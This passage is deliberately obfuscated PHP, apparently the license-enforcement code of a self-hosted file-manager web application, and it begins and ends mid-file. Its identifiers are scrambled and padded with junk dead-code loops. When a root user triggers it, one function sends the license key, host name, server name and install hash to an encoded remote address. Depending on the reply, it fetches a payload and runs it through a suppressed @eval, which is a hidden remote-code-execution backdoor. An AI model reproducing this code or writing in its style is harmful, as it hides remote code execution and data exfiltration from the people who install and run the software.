$¡’Ñúğ[$Ü­µÜ¤İ[193]]; $¡’Ñúğ[$Ü­µÜ¤İ[110]] = strrev(base64_encode($this->kyor2b37a819($¢ÄæÂ¼, $Ü­µÜ¤İ[195]))); $üØÕ™ı = $¿ß–úú»[732]; if (!$üØÕ™ı) { die; } $¹§º™ş¦ = rand_string(16); $Ú°´»Á¾ = $¹§º™ş¦ . $¡’Ñúğ[$Ü­µÜ¤İ[108]] . $this->kyor2b37a819(md5($¡’Ñúğ[$Ü­µÜ¤İ[153]]), $¹§º™ş¦); $îÓ‡’•¾ = $¿ß–úú»[733]; if (strlen($îÓ‡’•¾) < $¿ß–úú»[703]) { die; } $¡’Ñúğ[$Ü­µÜ¤İ[111]] = base64_encode(strrev($this->kyor2b37a819($Ú°´»Á¾, $Ü­µÜ¤İ[196]))); $¶£Á»æ = $¿ß–úú»[734]; while ($¶£Á»æ < $¿ß–úú»[691]) { if ($¶£Á»æ >= 0) { break; } $¶£Á»æ++; } if ($çØÏ¼¼é[$Ü­µÜ¤İ[197]] && $çØÏ¼¼é[$Ü­µÜ¤İ[197]] >= 1) { Model($Ü­µÜ¤İ[33])->setDeep($Ü­µÜ¤İ[198], $Ü­µÜ¤İ[122]); } Model($Ü­µÜ¤İ[33])->set($¡’Ñúğ); $êÛŒÇšÍ = md5($_SERVER[$Ü­µÜ¤İ[106]] . strrev($¢÷¤÷áÙ) . $¡’Ñúğ[$Ü­µÜ¤İ[191]]); $©ÂÊ »ª = strrev(substr($êÛŒÇšÍ, 10, 16)); $¡’Ä¿Ó = $this->dpweb0f778bc(json_encode($çØÏ¼¼é), $êÛŒÇšÍ); $È¥º¨µÑ = array_to_keyvalue(Model($Ü­µÜ¤İ[7])->listData(), $Ü­µÜ¤İ[199]); $ÌŞ³şèã = $È¥º¨µÑ[$Ü­µÜ¤İ[200]]; $âÖ×·° = $¿ß–úú»[735]; $âÏ­– = array(); $âÏ­–[$©ÂÊ »ª] = $¡’Ä¿Ó; $îâ›¼²„ = $¿ß–úú»[736]; Model($Ü­µÜ¤İ[7])->update($ÌŞ³şèã[$Ü­µÜ¤İ[201]], array($Ü­µÜ¤İ[202] => $âÏ­–)); $ÆğÓˆ–¤ = $¿ß–úú»[737]; if (strlen($ÆğÓˆ–¤) < $¿ß–úú»[687]) { die; } $this->mtlhef39ea2d = $çØÏ¼¼é; $this->cpmhdb3b5a5f = $¡’Ñúğ[$Ü­µÜ¤İ[108]]; $this->licenseRegistSuccess(); $··˜ı¤ = $¿ß–úú»[738]; while ($··˜ı¤ < $¿ß–úú»[697]) { if ($··˜ı¤ >= 0) { break; } $··˜ı¤++; } Cache::set($Ü­µÜ¤İ[203] . md5($¢÷¤÷áÙ . $Ü­µÜ¤İ[204]), $Ü­µÜ¤İ[6]); show_json(LNG($Ü­µÜ¤İ[189]), !0); $¸ˆç¨Â¯ = $¿ß–úú»[739]; } private function licenseRegistSuccess() { $Åßı¤‚ =& $_SERVER[æÂ¬Úû¨]; $Í­‡© = Model($Åßı¤‚[33])->get(); if ($Í­‡©[$Åßı¤‚[63]] != $Åßı¤‚[122]) { Model($Åßı¤‚[33])->set($Åßı¤‚[63], $Åßı¤‚[122]); } Action($Åßı¤‚[205])->initStart(!0); } private function uzevdfa5ce40() { $È•â³”Ô =& $_SERVER[ıÚ˜š²İ]; $Ñƒ©‰«™ =& $_SERVER[æÂ¬Úû¨]; Model($Ñƒ©‰«™[33])->set(array($Ñƒ©‰«™[153] => $Ñƒ©‰«™[6], $Ñƒ©‰«™[191] => $Ñƒ©‰«™[6], $Ñƒ©‰«™[108] => $Ñƒ©‰«™[109], $Ñƒ©‰«™[110] => $Ñƒ©‰«™[6], $Ñƒ©‰«™[111] => $Ñƒ©‰«™[6])); $üÒğŸß³ = $È•â³”Ô[740]; while ($üÒğŸß³ < $È•â³”Ô[697]) { if ($üÒğŸß³ >= 0) { break; } $üÒğŸß³++; } Model($Ñƒ©‰«™[33])->setDeep($Ñƒ©‰«™[198], $Ñƒ©‰«™[206]); $Å–ÍÜù = $È•â³”Ô[741]; if (!$Å–ÍÜù) { return; } $this->mtlhef39ea2d = array(); $this->cpmhdb3b5a5f = $Ñƒ©‰«™[109]; } private function yhozf9ac2b86() { $Ä‰èáÚ« =& $_SERVER[ıÚ˜š²İ]; $ˆ“‰Çˆí =& $_SERVER[æÂ¬Úû¨]; $_SERVER[$ˆ“‰Çˆí[162]] = _get($_SERVER, $ˆ“‰Çˆí[162], APP_HOST); $ïƒ§¾¬Ø = $Ä‰èáÚ«[742]; if (!$ïƒ§¾¬Ø) { die; } $this->cpmhdb3b5a5f = $ˆ“‰Çˆí[109]; $è¬•øÉÌ = $Ä‰èáÚ«[743]; while ($è¬•øÉÌ < $Ä‰èáÚ«[687]) { if ($è¬•øÉÌ >= 0) { break; } $è¬•øÉÌ++; } $î·ÑÎÚÛ = Model($ˆ“‰Çˆí[33])->get(); $ıß€¨«Š = $Ä‰èáÚ«[744]; while ($ıß€¨«Š < $Ä‰èáÚ«[693]) { if ($ıß€¨«Š >= 0) { break; } $ıß€¨«Š++; } if ($î·ÑÎÚÛ[$ˆ“‰Çˆí[108]] == $ˆ“‰Çˆí[109]) { return; } $Ë¦µáéû = Model($ˆ“‰Çˆí[33])->get($ˆ“‰Çˆí[100]); $¹êê’Ø· = $ˆ“‰Çˆí[203] . md5($Ë¦µáéû . $ˆ“‰Çˆí[204]); $ÅÆúı = $Ä‰èáÚ«[745]; if (strlen($ÅÆúı) < $Ä‰èáÚ«[697]) { die; } $Ø³±áö = Cache::get($¹êê’Ø·); if (!is_array($Ø³±áö) || !isset($Ø³±áö[$ˆ“‰Çˆí[207]]) || time() - $Ø³±áö[$ˆ“‰Çˆí[207]] >= 60) { $Şµ˜Ğ…³ = Model($ˆ“‰Çˆí[7])->loadList(); $ÈˆÖè›Ø = $Şµ˜Ğ…³[$ˆ“‰Çˆí[200]]; $Ë¾şŒÁ = md5($_SERVER[$ˆ“‰Çˆí[106]] . strrev($Ë¦µáéû) . $î·ÑÎÚÛ[$ˆ“‰Çˆí[191]]); $Î¾ıÆı© = strrev(substr($Ë¾şŒÁ, 10, 16)); $Ø³±áö = $this->mvasd6f56294($ÈˆÖè›Ø[$ˆ“‰Çˆí[86]][$Î¾ıÆı©], $Ë¾şŒÁ); $Ø³±áö = json_decode($Ø³±áö, !0); } if (!is_array($Ø³±áö)) { return $this->uzevdfa5ce40(); } $Ä‡£‘Äì = strtotime($Ø³±áö[$ˆ“‰Çˆí[129]]); if (time() >= $Ä‡£‘Äì) { return $this->uzevdfa5ce40(); } if (!isset($Ø³±áö[$ˆ“‰Çˆí[207]]) || time() - $Ø³±áö[$ˆ“‰Çˆí[207]] > 20) { $Ø³±áö[$ˆ“‰Çˆí[207]] = time(); Cache::set($¹êê’Ø·, $Ø³±áö); } $this->mtlhef39ea2d = $Ø³±áö; $this->cpmhdb3b5a5f = $î·ÑÎÚÛ[$ˆ“‰Çˆí[108]]; $ÍÔ€ıˆâ = $Ä‰èáÚ«[746]; if (strlen($ÍÔ€ıˆâ) < $Ä‰èáÚ«[687]) { return; } } private function ygtw88da3dbe() { $ïÎ÷ÆÍ» =& $_SERVER[ıÚ˜š²İ]; $Ÿ¡˜âµ¥ =& $_SERVER[æÂ¬Úû¨]; $öÇÈÍ× = $GLOBALS[$Ÿ¡˜âµ¥[13]]; $Ã…¹›Á½ = $ïÎ÷ÆÍ»[747]; while (strlen($Ã…¹›Á½) < $ïÎ÷ÆÍ»[703]) { if (!$Ã…¹›Á½) { break; } $Ã…¹›Á½++; } $ñó¸¹±’ = $_SERVER[$Ÿ¡˜âµ¥[24]]; $µÉÕÇ·˜ = $ïÎ÷ÆÍ»[748]; if (!$µÉÕÇ·˜) { return; } if ($ñó¸¹±’ == $Ÿ¡˜âµ¥[208] && $this->cpmhdb3b5a5f == $Ÿ¡˜âµ¥[109]) { show_json(LNG($Ÿ¡˜âµ¥[209]), !1, $Ÿ¡˜âµ¥[210]); } $í³îæ¹Ï = array($Ÿ¡˜âµ¥[211], $Ÿ¡˜âµ¥[212]); if (in_array($ñó¸¹±’, $í³îæ¹Ï)) { if ($this->cpmhdb3b5a5f == $Ÿ¡˜âµ¥[109] && isset($öÇÈÍ×[$Ÿ¡˜âµ¥[213]])) { show_json(LNG($Ÿ¡˜âµ¥[209]), !1, $Ÿ¡˜âµ¥[210]); die; } $àŠÑ¬Ö½ = $this->sgnh002721ba(); if ($àŠÑ¬Ö½ != intval($Ÿ¡˜âµ¥[214])) { if ($àŠÑ¬Ö½ <= Model($Ÿ¡˜âµ¥[125])->count()) { show_json(LNG($Ÿ¡˜âµ¥[215]), !1, $Ÿ¡˜âµ¥[210]); die; } } } } private function gkjuec70e794() { $§˜´‚‰² =& $_SERVER[ıÚ˜š²İ]; $¾µ‡ÃÎ =& $_SERVER[æÂ¬Úû¨]; $ü¡úÜå¡ = array($¾µ‡ÃÎ[119], $¾µ‡ÃÎ[120]); $ÀÖù´ú = $§˜´‚‰²[749]; while (strlen($ÀÖù´ú) < $§˜´‚‰²[703]) { if (!$ÀÖù´ú) { break; } $ÀÖù´ú++; } if (!KodUser::isRoot() || !isset($_GET[$¾µ‡ÃÎ[216]])) { return; } if (!in_array($_SERVER[$¾µ‡ÃÎ[24]], $ü¡úÜå¡)) { return; } $õ»³üÔö = $¾µ‡ÃÎ[217]; $õ»³üÔö = $this->mhox2be98799($õ»³üÔö, $¾µ‡ÃÎ[218]); $¥î’¾·ü = stream_context_create(array($¾µ‡ÃÎ[219] => array($¾µ‡ÃÎ[220] => $¾µ‡ÃÎ[221], $¾µ‡ÃÎ[222] => 3))); $Ö¿ñü°¥ = @file_get_contents($õ»³üÔö, !1, $¥î’¾·ü); header($¾µ‡ÃÎ[223]); if ($Ö¿ñü°¥ && strstr($Ö¿ñü°¥, $¾µ‡ÃÎ[224])) { echo $Ö¿ñü°¥; } die; } public function xjobbd683d4b($—Ï¡É) { $òÖıöõ =& $_SERVER[ıÚ˜š²İ]; $¾Õ‹ñÏš =& $_SERVER[æÂ¬Úû¨]; if ($this->cpmhdb3b5a5f == $¾Õ‹ñÏš[225]) { return $—Ï¡É; } $¬ÕÓ“’” = $this->versionPluginList(); $˜‰ŠûËç = explode($¾Õ‹ñÏš[226], $this->versionPluginFilter()); $¿Ç¨‡³Ë = $òÖıöõ[750]; if (!$¿Ç¨‡³Ë) { die; } $¸òæÈ = array(); $Ãëã·ùı = $òÖıöõ[751]; if (!$Ãëã·ùı) { die; } foreach ($¬ÕÓ“’” as $Ø§×Ôæø => $’¦ÔÈĞ“) { if ($’¦ÔÈĞ“ == $¾Õ‹ñÏš[227] && substr($this->cpmhdb3b5a5f, 0, 1) == $¾Õ‹ñÏš[227]) { continue; } if (!in_array($Ø§×Ôæø, $˜‰ŠûËç)) { $¸òæÈ[] = $Ø§×Ôæø; } } foreach ($¸òæÈ as $Ø§×Ôæø) { unset($—Ï¡É[$Ø§×Ôæø]); } return $—Ï¡É; $µ¹ºæ‘· = $òÖıöõ[752]; if (!$µ¹ºæ‘·) { die; } } private function versionPluginList() { $Â¤ëÕèı =& $_SERVER[æÂ¬Úû¨]; return array($Â¤ëÕèı[228] => $Â¤ëÕèı[227], $Â¤ëÕèı[229] => $Â¤ëÕèı[227], $Â¤ëÕèı[230] => $Â¤ëÕèı[227], $Â¤ëÕèı[231] => $Â¤ëÕèı[227], $Â¤ëÕèı[232] => $Â¤ëÕèı[233], $Â¤ëÕèı[234] => $Â¤ëÕèı[233], $Â¤ëÕèı[235] => $Â¤ëÕèı[233], $Â¤ëÕèı[236] => $Â¤ëÕèı[233], $Â¤ëÕèı[237] => $Â¤ëÕèı[233], $Â¤ëÕèı[238] => $Â¤ëÕèı[233], $Â¤ëÕèı[239] => $Â¤ëÕèı[233], $Â¤ëÕèı[240] => $Â¤ëÕèı[233], $Â¤ëÕèı[241] => $Â¤ëÕèı[233], $Â¤ëÕèı[242] => $Â¤ëÕèı[233], $Â¤ëÕèı[243] => $Â¤ëÕèı[233], $Â¤ëÕèı[244] => $Â¤ëÕèı[233], $Â¤ëÕèı[245] => $Â¤ëÕèı[233], $Â¤ëÕèı[246] => $Â¤ëÕèı[233]); } private function versionPluginFilter() { $ÖÑ€™… =& $_SERVER[ıÚ˜š²İ]; $ì×›‚’ï =& $_SERVER[æÂ¬Úû¨]; if ($this->cpmhdb3b5a5f == $ì×›‚’ï[109]) { return $ì×›‚’ï[6]; } $ğ¤—ÉŞ = _get($this->mtlhef39ea2d, $ì×›‚’ï[247], $ì×›‚’ï[6]); $Ö‰Èš¯¸ = $ÖÑ€™…[753]; if (!$Ö‰Èš¯¸) { return; } $Ï³©ÚÜ = _get($this->mtlhef39ea2d, $ì×›‚’ï[116], $ì×›‚’ï[6]); $Ø¾ÃÏ·‰ = _get($this->mtlhef39ea2d, $ì×›‚’ï[248], $ì×›‚’ï[6]); $ˆ˜¹Ô”¡ = $ÖÑ€™…[754]; if ($Ï³©ÚÜ > time() && $Ø¾ÃÏ·‰ > time()) { $ëÊ€èÅ· = explode($ì×›‚’ï[226], $ğ¤—ÉŞ); $‘”¹³ã = array_keys($this->versionPluginList()); $ğ¤—ÉŞ = array_merge($ëÊ€èÅ·, $‘”¹³ã); $ğ¤—ÉŞ = implode($ì×›‚’ï[226], array_filter(array_unique($ğ¤—ÉŞ))); } return $ğ¤—ÉŞ; } private function iveb0ed03303() { $éñª¯äó =& $_SERVER[æÂ¬Úû¨]; if ($this->cpmhdb3b5a5f != $éñª¯äó[109]) { $GLOBALS[$éñª¯äó[86]][$éñª¯äó[90]][$éñª¯äó[249]] = $éñª¯äó[206]; return; } $GLOBALS[$éñª¯äó[86]][$éñª¯äó[250]] = $éñª¯äó[122]; if (Model($éñª¯äó[251])->get($éñª¯äó[63]) != $éñª¯äó[206]) { Model($éñª¯äó[251])->set($éñª¯äó[63], $éñª¯äó[206]); } } public function mpaf86530b98() { return $_SERVER[æÂ¬Úû¨][252]; } private function xeswde79d183() { $¹ª  »¡ =& $_SERVER[ıÚ˜š²İ]; $®²à¹¼ =& $_SERVER[æÂ¬Úû¨]; $°Œ»İš = array($®²à¹¼[253], $®²à¹¼[254], $®²à¹¼[255]); $âùİ‹ £ = $®²à¹¼[256] . md5($®²à¹¼[257]); $îºß¨û› = $¹ª  »¡[755]; if (strlen($îºß¨û›) < $¹ª  »¡[693]) { return; } if ($this->cpmhdb3b5a5f == $®²à¹¼[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$®²à¹¼[24]], $°Œ»İš)) { return; } if (time() % 4 != 0) { return; } $–¦ ºÙĞ = call_user_func(array($®²à¹¼[258], $®²à¹¼[259]), $âùİ‹ £); $¬ºšÉ„ = $¹ª  »¡[756]; if (strlen($¬ºšÉ„) < $¹ª  »¡[697]) { return; } if ($–¦ ºÙĞ && time() - $–¦ ºÙĞ < intval($®²à¹¼[260])) { return; } call_user_func(array($®²à¹¼[258], $®²à¹¼[139]), $âùİ‹ £, time()); $Ğ’ÙÛê” = $¹ª  »¡[757]; $Ã¦›‹Ì£ = Model($®²à¹¼[33])->get($®²à¹¼[100]); $¹÷Ì¢²º = array($®²à¹¼[152] => Model($®²à¹¼[33])->get($®²à¹¼[153]), $®²à¹¼[167] => $this->cpmhdb3b5a5f, $®²à¹¼[163] => $_SERVER[$®²à¹¼[164]], $®²à¹¼[165] => Model($®²à¹¼[33])->get($®²à¹¼[131]), $®²à¹¼[105] => md5($_SERVER[$®²à¹¼[106]] . $Ã¦›‹Ì£), $®²à¹¼[156] => $®²à¹¼[136], $®²à¹¼[159] => $_SERVER[$®²à¹¼[160]]); $ÖÚ‰´ = $¹ª  »¡[758]; $¢ÄËïòÅ = $this->yclo34f72b08($®²à¹¼[261], $¹÷Ì¢²º); if (!is_array($¢ÄËïòÅ)) { return; } if ($¢ÄËïòÅ[$®²à¹¼[152]] && $¢ÄËïòÅ[$®²à¹¼[262]]) { if ($this->cahy6e9adc79($¢ÄËïòÅ[$®²à¹¼[262]]) == $¹÷Ì¢²º[$®²à¹¼[152]]) { return; } } $this->uzevdfa5ce40(); $Î’°ÆıÜ = $¹ª  »¡[759]; while ($Î’°ÆıÜ < $¹ª  »¡[687]) { if ($Î’°ÆıÜ >= 0) { break; } $Î’°ÆıÜ++; } if ($this->cahy6e9adc79($¢ÄËïòÅ[$®²à¹¼[262]]) != $¹÷Ì¢²º[$®²à¹¼[152]]) { $Æ €Ô¼§ = array($®²à¹¼[185] => $Ã¦›‹Ì£, $®²à¹¼[186] => $_SERVER[$®²à¹¼[106]], $®²à¹¼[187] => this_url(), $®²à¹¼[161] => $_SERVER[$®²à¹¼[162]]); $ìÙœÈ = $this->zqmv63555784(json_encode($Æ €Ô¼§)); $¢ÄËïòÅ = $this->yclo34f72b08($®²à¹¼[188] . $ìÙœÈ); if ($¢ÄËïòÅ && is_array($¢ÄËïòÅ) && isset($¢ÄËïòÅ[$®²à¹¼[262]])) { $ÏÍ¦À¥Ÿ = $this->mvasd6f56294($¢ÄËïòÅ[$®²à¹¼[262]], 2); if ($ÏÍ¦À¥Ÿ) { $ÏÍ¦À¥Ÿ = $this->cahy6e9adc79($ÏÍ¦À¥Ÿ); } if ($ÏÍ¦À¥Ÿ) { try { @eval($ÏÍ¦À¥Ÿ); } catch (Exception $˜™Ê”ÀÈ) { } } } } } private function yclo34f72b08($¶Ã¨õì = '', $¬ôôÃğ· = array(), $¬Ì¨ıÂ = 5) { $Ÿùì±½« =& $_SERVER[ıÚ˜š²İ]; $èµŠÈòª =& $_SERVER[æÂ¬Úû¨]; $¸ Üäáà = $èµŠÈòª[263]; $á«­Ï»ø = $Ÿùì±½«[760]; if (strlen($á«­Ï»ø) < $Ÿùì±½«[697]) { return; } $¸ Üäáà = $this->mhox2be98799($¸ Üäáà, $èµŠÈòª[264]); $¸ Üäáà = $¸ Üäáà . $¶Ã¨õì; $ŸÅ³óáö = $Ÿùì±½«[761]; if (strlen($ŸÅ³óáö) < $Ÿùì±½«[703]) { die; } if ($¬ôôÃğ· && is_array($¬ôôÃğ·)) { $¸ Üäáà = $¸ Üäáà . $èµŠÈòª[265] . http_build_query($¬ôôÃğ·); } if ($¬ôôÃğ· === -1) { return $¸ Üäáà; } $Õ¦É÷¥¥ = stream_context_create(array($èµŠÈòª[219] => array($èµŠÈòª[222] => $¬Ì¨ıÂ, $èµŠÈòª[220] => $èµŠÈòª[266]), $èµŠÈòª[267] => array($èµŠÈòª[268] => !1, $èµŠÈòª[269] => !1))); $¬ôôÃğ· = @file_get_contents($¸ Üäáà, !1, $Õ¦É÷¥¥); $·º˜µ = $Ÿùì±½«[738]; if (!$·º˜µ) { die; } return json_decode($¬ôôÃğ·, !0); $É†ı¶ĞÌ = $Ÿùì±½«[762]; while (strlen($É†ı¶ĞÌ) < $Ÿùì±½«[697]) { if (!$É†ı¶ĞÌ) { break; } $É†ı¶ĞÌ++; } } private function sgnh002721ba() { $Â»ÆŒªÆ =& $_SERVER[ıÚ˜š²İ]; $–Â¿üóê =& $_SERVER[æÂ¬Úû¨]; $Öæ÷çÂ = array($–Â¿üóê[270] => $–Â¿üóê[271], $–Â¿üóê[272] => $–Â¿üóê[273], $–Â¿üóê[274] => $–Â¿üóê[275], $–Â¿üóê[276] => $–Â¿üóê[277], $–Â¿üóê[278] => $–Â¿üóê[279], $–Â¿üóê[280] => $–Â¿üóê[214], $–Â¿üóê[281] => $–Â¿üóê[214], $–Â¿üóê[282] => $–Â¿üóê[271], $–Â¿üóê[283] => $–Â¿üóê[273], $–Â¿üóê[284] => $–Â¿üóê[275], $–Â¿üóê[285] => $–Â¿üóê[286], $–Â¿üóê[287] => $–Â¿üóê[277], $–Â¿üóê[288] => $–Â¿üóê[289], $–Â¿üóê[290] => $–Â¿üóê[279], $–Â¿üóê[291] => $–Â¿üóê[292], $–Â¿üóê[293] => $–Â¿üóê[294], $–Â¿üóê[295] => $–Â¿üóê[296]); $Æé§¹¹œ = $Â»ÆŒªÆ[763]; $óñ½ò‘œ = $Öæ÷çÂ[$this->cpmhdb3b5a5f]; $óñ½ò‘œ = intval($óñ½ò‘œ ? $óñ½ò‘œ : $–Â¿üóê[271]); $èó¢Çùí = $Â»ÆŒªÆ[764]; while ($èó¢Çùí < $Â»ÆŒªÆ[697]) { if ($èó¢Çùí >= 0) { break; } $èó¢Çùí++; } $‚­Å“êç = _get($this->mtlhef39ea2d, $–Â¿üóê[297]); $‚­Å“êç = $‚­Å“êç ? intval($‚­Å“êç) : 0; return $óñ½ò‘œ + $‚­Å“êç; $ååËæ€Û = $Â»ÆŒªÆ[765]; if (!$ååËæ€Û) { die; } } public function sqoyf5b8d858($ÎÑæµ¾) { $Ï‡±šğç =& $_SERVER[ıÚ˜š²İ]; $ø¿ÓşÀ¥ =& $_SERVER[æÂ¬Úû¨]; $…ƒóÏ§‡ = $this->sgnh002721ba(); $³ïáÁ­ = $Ï‡±šğç[766]; if ($ÎÑæµ¾[$ø¿ÓşÀ¥[298]] == $ø¿ÓşÀ¥[122]) { return; } if ($…ƒóÏ§‡ >= intval($ø¿ÓşÀ¥[214])) { return; } $˜ñÁÅ†¤ = Model($ø¿ÓşÀ¥[125])->count(); $òş®ô×× = $Ï‡±šğç[767]; if (strlen($òş®ô××) < $Ï‡±šğç[691]) { die; } if ($˜ñÁÅ†¤ <= $…ƒóÏ§‡) { return; } $ğ£Ç†ğà = Model($ø¿ÓşÀ¥[125])->field($ø¿ÓşÀ¥[298])->limit($…ƒóÏ§‡)->select(); $ù¸º·¡† = $Ï‡±šğç[768]; if (strlen($ù¸º·¡†) < $Ï‡±šğç[693]) { die; } $ğ£Ç†ğà = array_to_keyvalue($ğ£Ç†ğà, $ø¿ÓşÀ¥[6], $ø¿ÓşÀ¥[298]); if (!in_array($ÎÑæµ¾[$ø¿ÓşÀ¥[298]], $ğ£Ç†ğà)) { show_json($ø¿ÓşÀ¥[299], !1, $ø¿ÓşÀ¥[210]); } } public function mcuq9991e600() { $ã§¦†¡« =& $_SERVER[ıÚ˜š²İ]; $“Ñ•²¨È =& $_SERVER[æÂ¬Úû¨]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $áİ¹ìú = $“Ñ•²¨È[217]; $˜µèÑçˆ = $ã§¦†¡«[769]; if (!$˜µèÑçˆ) { die; } $áİ¹ìú = $this->mhox2be98799($áİ¹ìú, $“Ñ•²¨È[218]); $æµ¡İÈš = $ã§¦†¡«[770]; if (strlen($æµ¡İÈš) < $ã§¦†¡«[703]) { return; } $àÒŸÄ‰ô = stream_context_create(array($“Ñ•²¨È[219] => array($“Ñ•²¨È[220] => $“Ñ•²¨È[221], $“Ñ•²¨È[222] => 3))); $ÎÆÍŠ¢ì = $ã§¦†¡«[771]; if (!$ÎÆÍŠ¢ì) { return; } $Å›ÂÑƒ = @file_get_contents($áİ¹ìú, !1, $àÒŸÄ‰ô); $¡Ú¾ÒÇ = $ã§¦†¡«[772]; while ($¡Ú¾ÒÇ < $ã§¦†¡«[687]) { if ($¡Ú¾ÒÇ >= 0) { break; } $¡Ú¾ÒÇ++; } echo $“Ñ•²¨È[300] . hash_encode($Å›ÂÑƒ) . $“Ñ•²¨È[301]; } private function dpweb0f778bc($Óàäß€µ, $“¢Î»ß¯, $¼ëßÅºŞ = 3) { $Ş®ëôÑ =& $_SERVER[ıÚ˜š²İ]; $Õ†›ÄÏ =& $_SERVER[æÂ¬Úû¨]; usleep(1); $Óàäß€µ = trim($Óàäß€µ); $ø´öåŞÎ = $Ş®ëôÑ[773]; if (strlen($ø´öåŞÎ) < $Ş®ëôÑ[703]) { die; } $ØÆÄ±×‰ = mt_rand(0, 5) . $Õ†›ÄÏ[6]; $é¹¿¬Š– = $Ş®ëôÑ[774]; $÷¸ïêÙŠ = rand_string(15); $Ø”Ó’ÁÁ = $Õ†›ÄÏ[302]; $§çşÊÙù = $Ş®ëôÑ[775]; if (!$§çşÊÙù) { return; } switch ($ØÆÄ±×‰) { case $Õ†›ÄÏ[206]: $øƒäÜ÷ = $this->kyor2b37a819($Óàäß€µ, strrev($“¢Î»ß¯ . $÷¸ïêÙŠ)); break; case $Õ†›ÄÏ[122]: $øƒäÜ÷ = $this->kyor2b37a819($Óàäß€µ, strrev($÷¸ïêÙŠ . $“¢Î»ß¯)); $ˆéÓ€×µ = $Ş®ëôÑ[776]; while (strlen($ˆéÓ€×µ) < $Ş®ëôÑ[687]) { if (!$ˆéÓ€×µ) { break; } $ˆéÓ€×µ++; } break; $à†šÃªİ = $Ş®ëôÑ[777]; if (strlen($à†šÃªİ) < $Ş®ëôÑ[693]) { die; } case $Õ†›ÄÏ[303]: $øƒäÜ÷ = $this->kyor2b37a819($Óàäß€µ, base64_encode($÷¸ïêÙŠ . $“¢Î»ß¯)); $ã¸–Öñ‚ = $Ş®ëôÑ[778]; while (strlen($ã¸–Öñ‚) < $Ş®ëôÑ[703]) { if (!$ã¸–Öñ‚) { break; } $ã¸–Öñ‚++; } break; $©ª¢­ïô = $Ş®ëôÑ[779]; if (strlen($©ª¢­ïô) < $Ş®ëôÑ[687]) { return; } case $Õ†›ÄÏ[304]: $øƒäÜ÷ = $this->kyor2b37a819($Óàäß€µ, md5($÷¸ïêÙŠ . $“¢Î»ß¯)); $¯¨’¤ÃÔ = $Ş®ëôÑ[780]; break; case $Õ†›ÄÏ[305]: $Óàäß€µ = base64_encode($Óàäß€µ); $Ó²®ñ‘ = rand(0, 64); $ôİÎÓ§ = $Ş®ëôÑ[781]; if (!$ôİÎÓ§) { return; } $í±™³ù“ = $Ø”Ó’ÁÁ[$Ó²®ñ‘]; $ı¨Ìõøæ = md5($í±™³ù“ . md5($“¢Î»ß¯ . $í±™³ù“) . $“¢Î»ß¯); $¥ü…Æ»á = $Ş®ëôÑ[782]; while (strlen($¥ü…Æ»á) < $Ş®ëôÑ[687]) { if (!$¥ü…Æ»á) { break; } $¥ü…Æ»á++; } $ı¨Ìõøæ = substr($ı¨Ìõøæ, $Ó²®ñ‘ % 8, $Ó²®ñ‘ % 8 + 7); $µüè§Ÿª = $Ş®ëôÑ[783]; if (!$µüè§Ÿª) { return; } $”Ë¹Š©Ç = $Õ†›ÄÏ[6]; $²ÔºËØˆ = 0; $×¹·áşà = $Ş®ëôÑ[784]; while ($×¹·áşà < $Ş®ëôÑ[697]) { if ($×¹·áşà >= 0) { break; } $×¹·áşà++; } $´½Ùº¿Ó = 0; $ëÒ€œÑŸ = 0; $êâ¸ôÑ’ = $Ş®ëôÑ[785]; if (!$êâ¸ôÑ’) { return; } for ($²ÔºËØˆ = 0; $²ÔºËØˆ < strlen($Óàäß€µ); $²ÔºËØˆ++) { $ëÒ€œÑŸ = $ëÒ€œÑŸ == strlen($ı¨Ìõøæ) ? 0 : $ëÒ€œÑŸ; $¤ÒûÛÇˆ = $Ş®ëôÑ[786]; $´½Ùº¿Ó = ($Ó²®ñ‘ + strpos($Ø”Ó’ÁÁ, $Óàäß€µ[$²ÔºËØˆ]) + ord($ı¨Ìõøæ[$ëÒ€œÑŸ++])) % 64; $§”¬²ôà = $Ş®ëôÑ[787]; if (strlen($§”¬²ôà) < $Ş®ëôÑ[693]) { die; } $”Ë¹Š©Ç .= $Ø”Ó’ÁÁ[$´½Ùº¿Ó]; } $øƒäÜ÷ = hash_encode($í±™³ù“ . $”Ë¹Š©Ç); break; $‹ìÎ¦ŒÁ = $Ş®ëôÑ[788]; default: $øƒäÜ÷ = $this->kyor2b37a819($Óàäß€µ, $“¢Î»ß¯ . $÷¸ïêÙŠ); $§Ôêœ‘› = $Ş®ëôÑ[789]; break; $—„´Óæ¸ = $Ş®ëôÑ[790]; if (strlen($—„´Óæ¸) < $Ş®ëôÑ[693]) { return; } } $øƒäÜ÷ = strrev($ØÆÄ±×‰ . $÷¸ïêÙŠ . $øƒäÜ÷); if ($¼ëßÅºŞ - 1 > 0) { $øƒäÜ÷ = $this->dpweb0f778bc($øƒäÜ÷, $“¢Î»ß¯, $¼ëßÅºŞ - 1); } return $øƒäÜ÷; } private function mvasd6f56294($š¾ÜÄÔº, $ƒ»‰ë‚‰, $â‡ñ²Á = 3) { $Æ¢ÊÆÕ… =& $_SERVER[ıÚ˜š²İ]; $ı›ßÜİß =& $_SERVER[æÂ¬Úû¨]; if (!is_string($š¾ÜÄÔº) || strlen($š¾ÜÄÔº) < 10) { return !1; } $š¾ÜÄÔº = trim($š¾ÜÄÔº); $š¾ÜÄÔº = strrev($š¾ÜÄÔº); $şã³ù = $š¾ÜÄÔº[0]; $œÏÜğ˜î = $Æ¢ÊÆÕ…[791]; $ç£æˆ‘é = substr($š¾ÜÄÔº, 1, 15); $š¾ÜÄÔº = substr($š¾ÜÄÔº, 16); $¦ºñªÎ¯ = $ı›ßÜİß[302]; switch ($şã³ù) { case $ı›ßÜİß[206]: $çÅÀíÇÈ = $this->mhox2be98799($š¾ÜÄÔº, strrev($ƒ»‰ë‚‰ . $ç£æˆ‘é)); $¶ş‘áŒ = $Æ¢ÊÆÕ…[792]; break; case $ı›ßÜİß[122]: $çÅÀíÇÈ = $this->mhox2be98799($š¾ÜÄÔº, strrev($ç£æˆ‘é . $ƒ»‰ë‚‰)); $ÍÑÂŒÂ„ = $Æ¢ÊÆÕ…[793]; if (!$ÍÑÂŒÂ„) { return; } break; $ë¦¨€ = $Æ¢ÊÆÕ…[794]; case $ı›ßÜİß[303]: $çÅÀíÇÈ = $this->mhox2be98799($š¾ÜÄÔº, base64_encode($ç£æˆ‘é . $ƒ»‰ë‚‰)); $”˜¹ãö = $Æ¢ÊÆÕ…[795]; if (strlen($”˜¹ãö) < $Æ¢ÊÆÕ…[693]) { die; } break; $í´¶ÖÜ– = $Æ¢ÊÆÕ…[796]; if 